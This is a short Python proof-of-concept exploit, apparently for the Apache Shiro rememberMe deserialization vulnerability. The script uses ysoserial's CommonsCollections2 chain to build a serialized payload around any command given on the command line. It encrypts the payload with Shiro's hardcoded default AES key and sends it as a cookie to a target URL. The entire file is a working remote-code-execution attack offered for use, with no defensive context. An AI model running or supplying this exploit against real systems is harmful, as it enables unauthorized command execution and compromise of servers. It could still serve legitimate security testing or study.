# -*- coding: utf-8 -*-
import os
import base64
import uuid
import subprocess
import requests
import sys
from Crypto.Cipher import AES

JAR_FILE = 'target/ysoserial-0.0.5-all.jar'


def poc(url, command):
    target = url
    try:
        # 目标机执行的代码
        payload = generator(command, JAR_FILE)  # 生成payload
        r = requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=10)  # 发送验证请求

        print("rememberMe: "+payload.decode())
        print(r.status_code)
    except Exception as e:
        print(e)    
    return False


def generator(command, fp):
    if not os.path.exists(fp):
        raise Exception('jar file not found!')
    popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections2', command],
                             stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = "kPH+bIxk5D2deZiIxcaaaA=="
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

if __name__ == '__main__':
    url = sys.argv[1]
    command = sys.argv[2]
    poc(url, command)
    